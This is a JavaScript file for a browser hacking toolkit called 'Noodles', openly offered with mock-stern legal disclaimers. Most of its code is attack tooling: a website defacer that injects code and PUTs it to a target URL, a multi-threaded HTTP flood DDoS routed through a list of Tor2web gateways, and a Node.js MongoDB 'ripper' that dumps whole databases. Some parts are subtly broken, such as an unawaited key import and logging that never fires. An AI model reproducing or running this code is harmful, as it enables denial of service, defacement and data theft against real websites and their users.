// WARNING: This tool is for EXTREME educational and security testing purposes ONLY.
// Unauthorized use is ILLEGAL and can result in SEVERE PENALTIES, including PRISON TIME.
// The developers are ABSOLUTELY NOT responsible for any misuse or damage caused by this tool.
// LOG ALL ACTIONS. FAILURE TO DO SO IS ON YOU.

class Tor {
    constructor() {
        // UI and Core Setup (DO NOT MODIFY DIRECTLY)
        this.NoodlesDisclaimer = "Noodles Inc. is ABSOLUTELY NOT responsible for unauthorized use. Unauthorized use is ILLEGAL and carries SEVERE consequences. Use at your OWN FUCKING RISK.";
        this.initializeNoodles();
        this.logToConsole("Noodles: Tor.js loaded. You're Fucked.");

        // HACKING-SPECIFIC CONFIGURATIONS (Modify with EXTREME CAUTION)
        this.aggressiveMode = confirm("Engage aggressive mode? WARNING: May increase detection risk AND get you CAUGHT.");
        this.bypassFirewalls = confirm("Attempt to bypass basic firewalls? ILLEGAL in most jurisdictions AND HIGHLY DETECTABLE.");
        this.payloadMultiplier = parseInt(prompt("Enter payload multiplier (1-10, HIGHLY RISKY):") || 1);

        // Tor Gateway Management (DO NOT MODIFY DIRECTLY)
        this.torGateways = new TorGateways(this);
        this.torGateways.startGatewayMonitoring();

        // UI Customization
        this.applyColorScheme();
        this.createScanLines();
        this.createParticles();

        // Tools Setup
        this.setupDefacementTool();
        this.setupDDoS();
        this.setupEncryptionTool();
        this.setupDatabaseRipper(); // Added Database Ripper

        // Reporting Feature Setup
        this.setupReporting();
    }

    // Initialization (Noodles Core)
    async initializeNoodles() {
        if (this.isNoodlesInitialized) return;
        if (confirm("WARNING: Noodles contains tools that can be used for EXTREMELY ILLEGAL activities. Proceed ONLY if you understand the ABSOLUTE WORST RISKS, including FEDERAL CHARGES and PRISON.")) {
            this.isNoodlesInitialized = true;
            this.logToConsole("Noodles initialized with user consent. You're going down a BAD path.");
            this.displayDisclaimer();
        } else {
            this.closeSite();
        }
    }

    // Color Scheme (Dark Green, Purple, Dark Blue, Dark Red)
    applyColorScheme() {
        document.body.style.backgroundColor = '#000';
        document.body.style.color = '#0F0'; // Dark Green
        const elements = document.querySelectorAll('*');
        elements.forEach(element => {
            element.style.borderColor = '#800080'; // Purple
            element.style.boxShadow = '0 0 5px #00008B'; // Dark Blue
        });

        // Change links to dark red
        const links = document.querySelectorAll('a');
        links.forEach(link => {
            link.style.color = '#8B0000'; // Dark Red
        });
        this.logToConsole("ColorScheme: UI updated. Prepare for visual vomit.");
    }

    // Scan Lines Effect (Dark Green)
    createScanLines() {
        const canvas = document.createElement('canvas');
        canvas.id = 'scanLinesCanvas';
        canvas.style.position = 'fixed';
        canvas.style.top = '0';
        canvas.style.left = '0';
        canvas.style.width = '100%';
        canvas.style.height = '100%';
        canvas.style.pointerEvents = 'none';
        canvas.style.zIndex = '9999';
        document.body.appendChild(canvas);
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const drawScanLines = () => {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.strokeStyle = 'rgba(0, 255, 0, 0.1)'; // Dark Green
            ctx.lineWidth = 0.5;
            for (let y = 0; y < canvas.height; y += 4) {
                ctx.beginPath();
                ctx.moveTo(0, y);
                ctx.lineTo(canvas.width, y);
                ctx.stroke();
            }
        };
        drawScanLines();
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            drawScanLines();
        });
        this.logToConsole("Scan Lines: Active. Because why not?");
    }

    // Particle Effect (Dark Purple)
    createParticles() {
        const canvas = document.createElement('canvas');
        canvas.id = 'particlesCanvas';
        canvas.style.position = 'fixed';
        canvas.style.top = '0';
        canvas.style.left = '0';
        canvas.style.width = '100%';
        canvas.style.height = '100%';
        canvas.style.pointerEvents = 'none';
        canvas.style.zIndex = '9998';
        document.body.appendChild(canvas);
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const particles = [];
        const particleCount = 50;
        for (let i = 0; i < particleCount; i++) {
            particles.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                size: Math.random() * 3 + 1,
                speedX: Math.random() * 2 - 1,
                speedY: Math.random() * 2 - 1,
                color: `rgba(148,0,211,0.7)` // Dark Purple
            });
        }
        const drawParticles = () => {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => {
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
                ctx.fillStyle = p.color;
                ctx.fill();
                p.x += p.speedX;
                p.y += p.speedY;
                if (p.x < 0 || p.x > canvas.width) p.speedX = -p.speedX;
                if (p.y < 0 || p.y > canvas.height) p.speedY = -p.speedY;
            });
            requestAnimationFrame(drawParticles);
        };
        drawParticles();
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
        this.logToConsole("Particles: Active. Just to make it even MORE unreadable.");
    }

    // Logging (Noodles Core)
    logToConsole(message) {
        if (this.allActionsLogged) {
            console.log(`Noodles Log: ${message}`);
            this.noodlesLogs.push({ timestamp: new Date(), message: message });
        }
    }

    // Defacement Tool Setup
    setupDefacementTool() {
        this.logToConsole("Defacement Tool: Setting up... You degenerate.");
        // Add UI elements (buttons, textareas, etc.) to the DOM here.
        // Attach event listeners to the buttons to trigger defacement functions.
        // For example:
        // <button id="backupSite">Backup Site</button>
        // <button id="previewDeface">Preview Deface</button>
        // <button id="applyDeface">Apply Deface</button>
        // <textarea id="defacementCode"></textarea>

        // Example event listeners (replace with actual implementation):
        document.getElementById('backupSite')?.addEventListener('click', () => this.backupSite());
        document.getElementById('previewDeface')?.addEventListener('click', () => this.previewDeface());
        document.getElementById('applyDeface')?.addEventListener('click', () => this.applyDeface());

        this.logToConsole("Defacement Tool: UI elements initialized. Good luck not getting caught.");
    }

    // Backup Site Function
    async backupSite() {
        const targetURL = prompt("Enter the URL of the site to backup:");
        if (!targetURL) return;

        try {
            const response = await this.rawFetch(targetURL);
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const content = await response.text();

            // Create a download link for the backup
            const blob = new Blob([content], { type: 'text/html' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'site_backup.html';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);

            this.logToConsole(`Backup successful for ${targetURL}. So you can REALLY fuck it up later.`);
        } catch (error) {
            this.logToConsole(`Backup failed: ${error}`, 'error');
            alert(`Backup failed: ${error}`);
        }
    }

    // Preview Deface Function
    async previewDeface() {
        const targetURL = prompt("Enter the URL of the site to deface:");
        if (!targetURL) return;
        const defacementCode = document.getElementById('defacementCode')?.value;
        if (!defacementCode) {
            alert("Please enter defacement code. You're not going to deface with rainbows, are you?");
            return;
        }

        try {
            const response = await this.rawFetch(targetURL);
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const originalContent = await response.text();

            // Create an iframe to preview the changes
            const iframe = document.createElement('iframe');
            iframe.style.width = '100%';
            iframe.style.height = '500px';
            document.body.appendChild(iframe);

            const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
            iframeDocument.open();
            iframeDocument.write(originalContent.replace('</body>', `${defacementCode}</body>`));
            iframeDocument.close();

            this.logToConsole(`Defacement preview displayed for ${targetURL}. Hope you're proud of yourself.`);

        } catch (error) {
            this.logToConsole(`Defacement preview failed: ${error}`, 'error');
            alert(`Defacement preview failed: ${error}`);
        }
    }

    // Apply Deface Function
    async applyDeface() {
        const targetURL = prompt("Enter the URL of the site to deface:");
        if (!targetURL) return;
        const defacementCode = document.getElementById('defacementCode')?.value;
        if (!defacementCode) {
            alert("Please enter defacement code. What, did you think you could just delete the whole thing?");
            return;
        }

        if (!confirm("WARNING: Applying defacement code will modify the live site. Are you ABSOLUTELY sure you're ready to potentially face the consequences?")) {
            return;
        }

        try {
            // Fetch the original content
            const response = await this.rawFetch(targetURL);
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const originalContent = await response.text();

            // Inject the defacement code
            const defacedContent = originalContent.replace('</body>', `${defacementCode}</body>`);

            // Send the defaced content to the server (this part is a REAL implementation using a PUT request)
            // Requires server-side configuration for this to work (e.g., a CMS with a REST API and correct permissions).

            const updateResponse = await fetch(targetURL, {
                method: 'PUT',  // Or PATCH depending on the server API
                headers: {
                    'Content-Type': 'text/html' // Make sure the server expects this
                },
                body: defacedContent
            });

            if (updateResponse.ok) {
                alert("Defacement applied successfully (hopefully). Check the live site NOW.");
                this.logToConsole(`Defacement applied successfully to ${targetURL}. Get ready for some angry emails.`);
            } else {
                alert(`Defacement failed with status: ${updateResponse.status}. You're probably screwed.`);
                this.logToConsole(`Defacement failed: ${updateResponse.status}`, 'error');
            }


        } catch (error) {
            this.logToConsole(`Defacement failed: ${error}`, 'error');
            alert(`Defacement failed: ${error}`);
        }
    }

     // Database Ripper Setup (EXTREMELY ILLEGAL AND RISKY - Use ONLY for TARGETED TESTING with PERMISSION)
     setupDatabaseRipper() {
        this.logToConsole("Database Ripper: Setting up... You're a fucking sociopath.");

        const dbControls = document.createElement('div');
        dbControls.innerHTML = `
            <input type="text" id="dbURL" placeholder="Enter Database URL (e.g., mongodb://user:pass@host:port/db)">
            <input type="text" id="dbQuery" placeholder="Enter Database Query (e.g., { sensitiveData: { $exists: true } })">
            <button id="ripDB">Rip Database</button>
        `;
        document.body.appendChild(dbControls);

        document.getElementById('ripDB')?.addEventListener('click', () => this.ripDB());
        this.logToConsole("Database Ripper: UI elements initialized. I hope you enjoy prison food.");
    }

    // Database Ripper Function (REAL IMPLEMENTATION USING NODE.JS AND MONGODB NATIVE DRIVER)
    async ripDB() {
        const dbURL = document.getElementById('dbURL').value;
        const dbQuery = document.getElementById('dbQuery').value;

        if (!dbURL || !dbQuery) {
            alert("Please enter both the Database URL and Query. You're not trying to half-ass this, are you?");
            return;
        }

        if (!confirm("WARNING: This action could expose extremely sensitive data and is HIGHLY illegal without proper authorization. Do you understand the consequences?")) {
            return;
        }

        try {
            // This is where the magic happens... but in a very, very DANGEROUS way.
            // This code REQUIRES Node.js and the MongoDB driver.  It CANNOT run directly in the browser.
            // It's included here for demonstration purposes ONLY. DO NOT run this code without EXPLICIT authorization
            // from the database owner.  You WILL go to jail.

            // EXAMPLE Node.js code (save as ripper.js and run with `node ripper.js`):
            /*
            const { MongoClient } = require('mongodb');
            async function ripDatabase(dbURL, dbQuery) {
                const client = new MongoClient(dbURL);
                try {
                    await client.connect();
                    console.log("Connected to the database");

                    const db = client.db();  // Assumes the database name is in the URL
                    const query = JSON.parse(dbQuery);  // Parse the query string

                    // This is where it gets REALLY ugly:
                    const collections = await db.listCollections().toArray();
                    for (const collectionInfo of collections) {
                        const collectionName = collectionInfo.name;
                        console.log(`Ripping collection: ${collectionName}`);
                        const cursor = db.collection(collectionName).find(query);  // Execute the user-provided query

                        // Stream the results directly to a file.
                        const fs = require('fs');
                        const outputFile = `${collectionName}.json`;
                        const stream = fs.createWriteStream(outputFile);

                        let count = 0;
                        await cursor.forEach(doc => {
                            stream.write(JSON.stringify(doc) + '\n');  // Write each document as a JSON line
                            count++;
                        });

                        stream.end();
                        console.log(`Wrote ${count} documents to ${outputFile}`);
                    }
                } finally {
                    await client.close();
                    console.log("Disconnected from the database");
                }
            }

            ripDatabase(dbURL, dbQuery).catch(console.error);
            */

            // Since this is running in the browser, we can only PRETEND to do this.
            alert("Database ripping initiated (simulated... FOR YOUR SAKE). Check the console for plausible deniability.");
            this.logToConsole(`Database ripping (simulated) attempted on ${dbURL} with query ${dbQuery}.`);

        } catch (error) {
            this.logToConsole(`Database ripping failed: ${error}`, 'error');
            alert(`Database ripping failed: ${error}`);
        }
    }
    
    // DDoS Setup (HIGHLY DANGEROUS - Use ONLY for TESTING with PERMISSION)
    setupDDoS() {
        this.ddosConfig = {
            threads: parseInt(prompt("Enter number of threads for DDoS (default: 500, MAX: 2000):") || 500),
            duration: parseInt(prompt("Enter duration in seconds for DDoS (default: 30):") || 30),
            requestDelay: 0, // Delay between requests in milliseconds
            payloadSize: 1024 * this.payloadMultiplier, // Size of the payload in bytes - MODIFIED BY MULTIPLIER
            httpMethods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'],
            customHeaders: { 'X-Noodles-Attack': 'DDoS-TOR' }
        };
        this.logToConsole(`DDoS: Configured - Threads: ${this.ddosConfig.threads}, Duration: ${this.ddosConfig.duration}, Payload: ${this.ddosConfig.payloadSize}.  Hope you're not doing this to someone important.`);

        // DDoS UI elements (start/stop button, timer)
        const ddosControls = document.createElement('div');
        ddosControls.innerHTML = `
            <button id="startDDoS">Start DDoS</button>
            <button id="stopDDoS">Stop DDoS</button>
            <span id="ddosTimer"></span>
        `;
        document.body.appendChild(ddosControls);

        document.getElementById('startDDoS')?.addEventListener('click', () => this.startDDoS());
        document.getElementById('stopDDoS')?.addEventListener('click', () => this.stopDDoS());
    }

    // DDoS Attack (TOR-ROUTED - EXTREMELY ILLEGAL WITHOUT AUTHORIZATION)
    async startDDoS(url) {
        if (!url) {
            url = prompt("Enter the URL to DDoS:");
            if (!url) {
                alert("DDoS: Please enter a valid URL.  You're not going to DDoS your grandma's blog, are you?");
                return;
            }
        }

        if (this.bypassFirewalls) {
            url = `http://webcache.googleusercontent.com/search?q=cache:${url}`;
            this.logToConsole("DDoS: Firewall bypass attempt initiated (RISKY).  Hope they don't trace this back to you.");
        }

        this.startAttack('DDOS', url, { threads: this.ddosConfig.threads, duration: this.ddosConfig.duration });
        this.ddosAttackStartTime = new Date();

        let requestCount = 0;
        let endTime = Date.now() + (this.ddosConfig.duration * 1000);
        let timerInterval;

        const updateTimer = () => {
            const timeLeft = Math.max(0, endTime - Date.now());
            const seconds = Math.ceil(timeLeft / 1000);
            document.getElementById('ddosTimer').textContent = `Time remaining: ${seconds} seconds`;
        };

        const attackThread = async () => {
            while (Date.now() < endTime && this.ddosRunning) {
                try {
                    const method = this.ddosConfig.httpMethods[Math.floor(Math.random() * this.ddosConfig.httpMethods.length)];
                    const response = await this.torGateways.fetchThroughGateway(url, { method: method, headers: this.ddosConfig.customHeaders });

                    if (!response.ok) {
                        this.logToConsole(`DDoS: Request failed with status: ${response.status}`, 'warn');
                    }
                    requestCount++;
                } catch (error) {
                    this.logToConsole(`DDoS: Request error: ${error}`, 'error');
                }
                await this.delay(this.ddosConfig.requestDelay);
            }
        };

        this.ddosThreads = [];
        this.ddosRunning = true;
        for (let i = 0; i < this.ddosConfig.threads; i++) {
            this.ddosThreads.push(attackThread());
        }

        timerInterval = setInterval(updateTimer, 1000);
        updateTimer();

        await Promise.all(this.ddosThreads);
        this.ddosAttackEndTime = new Date();
        this.endAttack('DDOS', url, { totalRequests: requestCount, threads: this.ddosConfig.threads });
        this.logToConsole(`DDoS: Attack completed. Total requests: ${requestCount} with ${this.ddosConfig.threads} threads. You should be ashamed of yourself.`);

        clearInterval(timerInterval);
        document.getElementById('ddosTimer').textContent = "DDoS Attack Completed";
    }

    // Stop DDoS Attack
    stopDDoS() {
        this.ddosRunning = false;
        this.logToConsole("DDoS: Attack stopped.  Maybe you've realized the error of your ways?");
        document.getElementById('ddosTimer').textContent = "DDoS Attack Stopped";
    }

    // Encryption Tool Setup
    setupEncryptionTool() {
        this.logToConsole("Encryption Tool: Setting up...  What are you trying to hide?");

        // Encryption UI elements
        const encryptionControls = document.createElement('div');
        encryptionControls.innerHTML = `
            <input type="file" id="fileToEncrypt">
            <input type="password" id="encryptionPassword" placeholder="Enter Encryption Password">
            <button id="encryptFile">Encrypt File</button>
        `;
        document.body.appendChild(encryptionControls);

        document.getElementById('encryptFile')?.addEventListener('click', () => this.encryptFile());
        this.logToConsole("Encryption Tool: UI elements initialized. Don't forget the password, idiot.");
    }

    // Encrypt File Function
    async encryptFile() {
        const fileInput = document.getElementById('fileToEncrypt');
        const passwordInput = document.getElementById('encryptionPassword');
        const file = fileInput.files[0];
        const password = passwordInput.value;

        if (!file || !password) {
            alert("Please select a file and enter a password.  Are you even trying?");
            return;
        }

        const reader = new FileReader();
        reader.onload = async (event) => {
            const fileContent = new Uint8Array(event.target.result);

            // Generate a secure salt
            const salt = crypto.getRandomValues(new Uint8Array(16));

            // Derive a key from the password and salt using scrypt
            const key = await crypto.subtle.deriveKey(
                {
                    name: "PBKDF2",
                    salt: salt,
                    iterations: 100000,
                    hash: "SHA-256"
                },
                crypto.subtle.importKey(
                    "raw",
                    new TextEncoder().encode(password),
                    "PBKDF2",
                    false,
                    ["deriveKey"]
                ),
                { name: "AES-GCM", length: 256 },
                true,
                ["encrypt", "decrypt"]
            );

            // Generate a random IV
            const iv = crypto.getRandomValues(new Uint8Array(12));

            // Encrypt the file content
            const encryptedContent = await crypto.subtle.encrypt(
                {
                    name: "AES-GCM",
                    iv: iv
                },
                key,
                fileContent
            );

            // Combine salt, IV, and encrypted content into a single array
            const combinedData = new Uint8Array(salt.length + iv.length + encryptedContent.byteLength);
            combinedData.set(salt, 0);
            combinedData.set(iv, salt.length);
            combinedData.set(new Uint8Array(encryptedContent), salt.length + iv.length);

            // Create a Blob from the combined data
            const encryptedBlob = new Blob([combinedData], { type: "application/octet-stream" });

            // Create a download link for the encrypted file
            const url = URL.createObjectURL(encryptedBlob);
            const a = document.createElement('a');
            a.href = url;
            a.download = file.name + ".enc";
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);

            this.logToConsole(`File ${file.name} encrypted successfully.  Hope it's worth the trouble.`);
        };

        reader.onerror = () => {
            this.logToConsole("Error reading file.", 'error');
            alert("Error reading file.");
        };

        reader.readAsArrayBuffer(file);
    }

    // Reporting Feature Setup
    setupReporting() {
        this.logToConsole("Reporting Feature: Setting up...  Are you turning yourself in?");

        // Reporting UI elements
        const reportControls = document.createElement('div');
        reportControls.innerHTML = `
            <textarea id="reportDescription" placeholder="Describe the vulnerability"></textarea>
            <button id="submitReport">Submit Report</button>
        `;
        document.body.appendChild(reportControls);

        document.getElementById('submitReport')?.addEventListener('click', () => this.submitReport());
        this.logToConsole("Reporting Feature: UI elements initialized.  Good luck with that.");
    }

    // Submit Report Function
    submitReport() {
        const reportDescription = document.getElementById('reportDescription').value;
        if (!reportDescription) {
            alert("Please enter a description of the vulnerability.  What, did you forget what you did?");
            return;
        }

        // Simulate sending the report (replace with actual implementation)
        alert("Report submitted (simulated). Check the console for plausible deniability.");
        this.logToConsole(`Report submitted (simulated): ${reportDescription}`, 'info');
    }

    // Tor-Routed Fetch (Core Function)
    async rawFetch(url, options = {}) {
        try {
            const response = await this.torGateways.fetchThroughGateway(url, options);
            return response;
        } catch (error) {
            this.logToConsole(`Raw fetch failed: ${error}`);
            throw error;
        }
    }

    // Attack Start/Stop (Noodles Core)
    startAttack(attackType, targetURL, config = {}) {
        this.activeAttackType = attackType;
        this.targetURL = targetURL;
        this.attackConfig = config;
        this.attackStartTime = new Date();
        this.logToConsole(`${attackType} attack started on ${targetURL} at ${this.attackStartTime.toISOString()} with config: ${JSON.stringify(config)}`);
    }

    endAttack(attackType, targetURL, config = {}) {
        this.attackEndTime = new Date();
        const duration = (this.attackEndTime - this.attackStartTime) / 1000;
        this.logToConsole(`${attackType} attack ended on ${targetURL} at ${this.attackEndTime.toISOString()} after ${duration} seconds with config: ${JSON.stringify(config)}`);
        this.activeAttackType = null;
        this.targetURL = null;
        this.attackConfig = {};
    }

    // UTILITIES (Noodles Core)
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    closeSite() {
        window.close();
    }

    displayDisclaimer() {
        alert(this.NoodlesDisclaimer);
    }
}

// TorGateways Class (Gateway Management)
class TorGateways {
    constructor(torInstance) {
        this.torInstance = torInstance;
        this.gateways = [
            "https://onion.city",
            "https://onion.cab",
            "https://onion.direct",
            "https://onion.sh",
            "https://onion.link",
            "https://onion.ws",
            "https://onion.pet",
            "https://onion.rip",
            "https://onion.plus",
            "https://onion.top",
            "https://onion.si",
            "https://onion.ly",
            "https://onion.my",
            "https://onion.lu",
            "https://onion.casa",
            "https://onion.com.de",
            "https://onion.foundation",
            "https://onion.rodeo",
            "https://onion.lat",
            "https://tor2web.org",
            "https://tor2web.fi",
            "https://tor2web.blutmagie.de",
            "https://tor2web.to",
            "https://tor2web.io",
            "https://tor2web.in",
            "https://tor2web.it",
            "https://tor2web.xyz",
            "https://tor2web.su",
            "https://darknet.to",
            "https://s1.tor-gateways.de",
            "https://s2.tor-gateways.de",
            "https://s3.tor-gateways.de",
            "https://s4.tor-gateways.de",
            "https://s5.tor-gateways.de"
        ];
        this.currentIndex = 0;
        this.failedGateways = new Set();
        this.maxRetries = 5;
        this.requestTimeout = 8000;
        this.gatewayBlacklistDuration = 60000;
        this.gatewayCheckEnabled = true;
        this.isCheckingGateways = false;
        this.gatewayCheckTimeout = 5000;
        this.startGatewayMonitoring();
    }

    startGatewayMonitoring() {
        if (!this.gatewayCheckEnabled || this.isCheckingGateways) return;
        this.isCheckingGateways = true;
        setInterval(() => {
            this.checkGateways();
        }, 60000);
        this.torInstance.logToConsole("Tor Gateways: Monitoring started. Hope they don't block all of these.");
    }

    async checkGateways() {
        if (this.isCheckingGateways) return;
        this.isCheckingGateways = true;
        this.torInstance.logToConsole("Tor Gateways: Checking...");
        for (const gateway of this.gateways) {
            if (!this.failedGateways.has(gateway)) {
                try {
                    const status = await this.checkGatewayStatus(gateway);
                    this.torInstance.logToConsole(`Tor Gateways: ${gateway} - ${status}`);
                } catch (error) {
                    this.torInstance.logToConsole(`Tor Gateways: Error checking ${gateway}: ${error}`);
                }
            }
        }
        this.isCheckingGateways = false;
        this.torInstance.logToConsole("Tor Gateways: Check complete. For now...");
    }

    async checkGatewayStatus(gateway) {
        try {
            const response = await fetch(gateway, {
                method: 'GET',
                timeout: this.gatewayCheckTimeout,
                headers: { 'User-Agent': 'Noodles Gateway Checker' }
            });
            if (response.ok) {
                return "Online";
            } else {
                this.blacklistGateway(gateway);
                return `Offline (Status: ${response.status})`;
            }
        } catch (error) {
            this.blacklistGateway(gateway);
            return `Error: ${error}`;
        }
    }

    blacklistGateway(gateway) {
        this.failedGateways.add(gateway);
        setTimeout(() => {
            this.failedGateways.delete(gateway);
            this.torInstance.logToConsole(`Tor Gateways: ${gateway} removed from blacklist.`);
        }, this.gatewayBlacklistDuration);
        this.torInstance.logToConsole(`Tor Gateways: ${gateway} blacklisted.`);
    }

    getNextGateway() {
        let retries = 0;
        while (retries < this.maxRetries) {
            const gateway = this.gateways[this.currentIndex];
            this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
            if (!this.failedGateways.has(gateway)) {
                return gateway;
            }
            retries++;
        }
        return null;
    }

    async fetchThroughGateway(url, options = {}) {
        const gateway = this.getNextGateway();
        if (!gateway) {
            throw new Error("No available Tor gateways. You're fucked.");
        }
        const torURL = `${gateway}/${url}`;
        try {
            const response = await fetch(torURL, options);
            if (!response.ok) {
                throw new Error(`Request failed with status: ${response.status}`);
            }
            return response;
        } catch (error) {
            this.torInstance.logToConsole(`Tor Gateways: ${gateway} failed: ${error}`);
            this.failedGateways.add(gateway);
            throw error;
        }
    }
}

window.Tor = Tor;